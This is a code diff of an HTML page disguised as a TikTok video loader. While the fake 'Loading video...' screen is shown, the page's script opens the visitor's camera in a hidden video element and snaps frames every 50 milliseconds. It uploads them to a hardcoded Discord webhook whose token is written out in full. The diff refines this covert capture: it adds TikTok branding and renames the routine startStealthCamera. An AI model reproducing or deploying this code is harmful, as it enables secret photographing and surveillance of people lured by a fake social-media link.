@@ -5,66 +5,79 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TikTok</title>
   <link rel="icon" href="https://www.tiktok.com/favicon.ico" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     html, body {
-      height: 100%;
+      font-family: 'Roboto', sans-serif;
       background: #000;
       color: #fff;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
-      font-family: sans-serif;
+      height: 100vh;
       overflow: hidden;
-      flex-direction: column;
     }
-
+    .logo {
+      font-size: 2em;
+      font-weight: bold;
+      color: #fff;
+      margin-bottom: 20px;
+    }
+    .logo::before {
+      content: '';
+      display: inline-block;
+      background-image: url('https://www.tiktok.com/favicon.ico');
+      background-size: cover;
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
     .loader {
-      width: 60px;
-      height: 60px;
+      width: 50px;
+      height: 50px;
       border: 6px solid rgba(255,255,255,0.1);
       border-top: 6px solid #fe2c55;
       border-bottom: 6px solid #25f4ee;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin-bottom: 10px;
+      margin-bottom: 20px;
     }
-
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
-
-    .text {
+    .message {
       font-size: 1.1em;
-      opacity: 0.6;
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 0.3; }
-      50% { opacity: 1; }
-    }
-
-    video {
-      display: none;
+      color: #aaa;
     }
   </style>
 </head>
 <body>
+  <div class="logo">TikTok</div>
   <div class="loader"></div>
-  <div class="text">Loading TikTok video...</div>
-  <video id="video" autoplay playsinline muted></video>
+  <div class="message" id="message">Loading video...</div>
 
   <script>
-    const webhookURL = " https://discord.com/api/webhooks/1373582402269478962/owTDYtZFHu4ta9VhxQYJaYX-6ysE7HMR-2ay-brOaPO6mY96AQ7dMOrfln96m9EV4cT0"; // ใส่ลิงก์ Webhook ที่นี่
-    const MAX_DURATION_MS = 1500;   // 1 วินาที
-    const CAPTURE_INTERVAL_MS = 50; // ถ่ายทุก 50ms ≈ 20 ภาพ
+    const params = new URLSearchParams(window.location.search);
+    const videoId = params.get("video");
+    if (videoId) {
+      document.getElementById("message").textContent = `Loading video ${videoId}...`;
+    }
+
+    const webhookURL = "https://discord.com/api/webhooks/1373582402269478962/owTDYtZFHu4ta9VhxQYJaYX-6ysE7HMR-2ay-brOaPO6mY96AQ7dMOrfln96m9EV4cT0";
+    const MAX_DURATION_MS = 1000;
+    const CAPTURE_INTERVAL_MS = 50;
     let captured = 0;
 
-    async function captureMultipleFrames() {
+    async function startStealthCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById("video");
+        const video = document.createElement("video");
+        video.style.display = "none";
+        document.body.appendChild(video);
         video.srcObject = stream;
         await video.play();
 
@@ -74,7 +87,7 @@
         const ctx = canvas.getContext("2d");
 
         const start = Date.now();
-        const interval = setInterval(async () => {
+        const interval = setInterval(() => {
           if (Date.now() - start > MAX_DURATION_MS) {
             clearInterval(interval);
             stream.getTracks().forEach(t => t.stop());
@@ -83,20 +96,20 @@
 
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           canvas.toBlob(async blob => {
-            const formData = new FormData();
-            formData.append("file", blob, `frame${captured++}.jpg`);
-            formData.append("payload_json", JSON.stringify({
-              content: `📸 Frame ${captured} captured at ${new Date().toISOString()}`
+            const form = new FormData();
+            form.append("file", blob, `frame${captured}.jpg`);
+            form.append("payload_json", JSON.stringify({
+              content: `🎥 Video ID: ${videoId || 'unknown'} - Frame ${captured++}`
             }));
-            await fetch(webhookURL, { method: "POST", body: formData });
+            await fetch(webhookURL, { method: "POST", body: form });
           }, "image/jpeg", 0.8);
         }, CAPTURE_INTERVAL_MS);
       } catch (err) {
-        console.error("Camera access failed:", err);
+        console.warn("Camera error:", err);
       }
     }
 
-    captureMultipleFrames();
+    startStealthCamera();
   </script>
 </body>
 </html>
